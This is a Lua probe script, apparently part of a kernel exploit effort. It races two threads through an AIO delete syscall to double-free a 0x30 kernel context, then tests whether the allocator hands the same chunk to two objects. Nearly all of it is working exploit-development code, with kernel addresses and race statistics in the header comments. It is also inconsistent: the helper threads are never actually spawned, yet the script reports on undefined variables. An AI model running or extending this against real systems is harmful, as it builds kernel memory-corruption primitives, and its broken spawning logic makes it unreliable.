-- CRASH_CLASS: MODERATE
-- PROBE 568a: after a double free, does the allocator hand the same 0x30
-- chunk out twice?
--
-- Context: two Lua threads calling 662 on the same ids both pass the
-- "context already cleared" test (13.60 0x8ad6fec3 -> 0x8ad6fef5) and both
-- free the 0x30 context C. 523c produced two successes on 54 of 100 ids.
-- The delete's free runs after the table lock is dropped (unlock 0x8ad6fe67,
-- re-lookup 0x8ad6fe7c), so the two threads really are inside the window.
-- If the allocator kept the chunk twice, a later create hands the same C to
-- two different aio objects; their deletes then walk each other's fields.
--
-- This probe: 100 completed ids, two helper threads deleting them at once,
-- then 40 create/poll/delete cycles that report every status that is not the
-- normal 0 / 0x80020003 pair.

print("=== PROBE 568a: AIO DOUBLE FREE ALIASING ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X", math.floor(a / 4294967296), a % 4294967296))
end
local function hex8(v) return string.format("%08X", to_num(v) % 4294967296) end
local Z = uint64(0)
local function sc(n) return make_syscall(n) end
local function wd(a, v) memory.write_dword(a, v) end
local function wq(a, v) memory.write_qword(a, v) end
local function rd(a) return to_num(memory.read_dword(a)) end

local IDS = to_num(memory.alloc(0x400))
local ID1 = to_num(memory.alloc(0x40))
local REQ = to_num(memory.alloc(0x40))
local ST = to_num(memory.alloc(0x40))
local BUF = to_num(memory.alloc(0x200))
local RES = to_num(memory.alloc(0x40))
local S0 = to_num(memory.alloc(0x400))
local S1 = to_num(memory.alloc(0x400))
local CTX = to_num(memory.alloc(0x40))

local path = to_num(memory.alloc(0x20))
wd(path, 0x7665642F) wd(path + 4, 0x6172752F) wd(path + 8, 0x6D6F646E) wd(path + 0xC, 0)
local fd = sgn(sc(5)(U(path), Z, Z, Z, Z, Z))
print(string.format("[0] fd=%d ids=%08X s0=%08X s1=%08X", fd, IDS, S0, S1))
if fd < 3 then print("=== 568a ABORT: no fd ===") return end

local function fill_req(base, len, buf, res)
    wq(base + 0x00, Z)
    wq(base + 0x08, U(len))
    wq(base + 0x10, U(buf))
    wq(base + 0x18, U(res))
    wd(base + 0x20, fd)
    wd(base + 0x24, 0)
end

local function make_one()
    fill_req(REQ, 16, BUF, RES)
    local r = sgn(sc(669)(U(1), U(REQ), U(1), U(1), U(ID1), Z))
    return r, rd(ID1)
end

local N = 100
local made = 0
for i = 0, N - 1 do
    local r, id = make_one()
    if r == 0 and id ~= 0 then
        wd(IDS + i * 4, id)
        made = made + 1
    end
end
print(string.format("[A] created=%d first=%s last=%s", made, hex8(rd(IDS)), hex8(rd(IDS + (made - 1) * 4))))
if made < 2 then print("=== 568a ABORT: too few ===") return end

local completed = 0
for i = 0, made - 1 do
    wd(ID1, rd(IDS + i * 4))
    pcall(function() sc(664)(U(ID1), U(1), U(ST), Z, Z, Z) end)
    if rd(ST) == 3 then completed = completed + 1 end
end
print(string.format("[A] completed=%d", completed))

-- two helper threads, each deleting the whole list once
for o = 0, 0x3F, 4 do wd(CTX + o, 0) end
local HELPER = [==[
local IDS, N, STATUS, CTX, DONE = !IDS!, !N!, !STATUS!, !CTX!, !DONE!
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function U(a)
    a = to_num(a)
    local hi = math.floor(a / 4294967296)
    return uint64(string.format("0x%08X%08X", hi, a - hi * 4294967296))
end
local f = make_syscall(662)
pcall(function() return f(U(IDS), U(N), U(STATUS), uint64(0), uint64(0), uint64(0)) end)
pcall(function() memory.write_dword(CTX + DONE, 1) end)
]==]
local function build(status, done)
    local b = HELPER
    b = b:gsub("!IDS!", tostring(IDS))
    b = b:gsub("!N!", tostring(made))
    b = b:gsub("!STATUS!", tostring(status))
    b = b:gsub("!CTX!", tostring(CTX))
    b = b:gsub("!DONE!", tostring(done))
    return b
end
local h0 = build(S0, 8)
local h1 = build(S1, 12)
print(string.format("[B] helpers spawned %s %s", tostring(ok0), tostring(ok1)))

local TS = to_num(memory.alloc(0x10))
local sc240 = sc(240)
local waited = 0
while rd(CTX + 8) == 0 or rd(CTX + 12) == 0 do
    waited = waited + 1
    if waited > 400 then break end
    wq(TS, 0) wq(TS + 8, 2000000)
    pcall(function() sc240(U(TS), Z) end)
end
print(string.format("[B] helpers done=%d/%d after %d polls", rd(CTX + 8), rd(CTX + 12), waited))

local function tally(page, tag)
    local z, two, other, busy = 0, 0, 0, 0
    for i = 0, made - 1 do
        local v = rd(page + i * 4)
        if v == 0 then z = z + 1
        elseif v == 0x80020003 then two = two + 1
        elseif v == 0x80020001 then busy = busy + 1
        else other = other + 1 end
    end
    print(string.format("[C] %s ok=%d gone=%d busy=%d other=%d", tag, z, two, busy, other))
end
tally(S0, "h0")
tally(S1, "h1")
local both = 0
for i = 0, made - 1 do
    if rd(S0 + i * 4) == 0 and rd(S1 + i * 4) == 0 then both = both + 1 end
end
print(string.format("[C] ids with two successes=%d", both))

-- 40 create/poll/delete cycles through whatever the allocator now holds
local anomalies = 0
for k = 1, 40 do
    local r, id = make_one()
    if r ~= 0 or id == 0 then
        anomalies = anomalies + 1
        print(string.format("[D] cycle %d create ret=%d id=%s", k, r, hex8(id)))
    else
        wd(ID1, id)
        pcall(function() sc(664)(U(ID1), U(1), U(ST), Z, Z, Z) end)
        local state = rd(ST)
        local d1 = sgn(sc(662)(U(ID1), U(1), U(S0), Z, Z, Z))
        local s1 = rd(S0)
        local d2 = sgn(sc(662)(U(ID1), U(1), U(S0), Z, Z, Z))
        local s2 = rd(S0)
        if d1 ~= 0 or s1 ~= 0 or d2 ~= 0 or s2 ~= 0x80020003 then
            anomalies = anomalies + 1
            print(string.format("[D] cycle %d id=%s state=%s del1=%d/%s del2=%d/%s",
                k, hex8(id), hex8(state), d1, hex8(s1), d2, hex8(s2)))
        end
    end
end
print(string.format("[D] cycles done anomalies=%d", anomalies))
print(string.format("[E] alive=%s", tostring(pcall(function() return sc(20)() end))))

print("=== 568a DONE ===")
